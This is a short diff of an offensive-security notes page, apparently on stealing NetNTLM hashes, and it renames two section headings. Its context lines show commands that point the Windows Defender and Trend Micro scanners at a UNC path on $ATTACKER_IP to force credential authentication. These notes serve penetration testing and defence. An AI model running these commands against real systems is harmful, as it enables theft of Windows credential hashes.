@@ -59,13 +59,13 @@ HTML documents can be crafted \(or injected with content when successfully explo
 
 {% embed url="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" %}
 
-### Windows Defender MpCmdRun
+### Windows Defender Remote Scanning
 
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\$ATTACKER_IP\file.txt
 ```
 
-### Trend Micro Remote Scan Client
+### Trend Micro Remote Scanning
 
 ```bash
 C:\Program Files (x86)\Trend Micro\OfficeScan Clien\PccNt.exe \\$ATTACKER_IP\s\
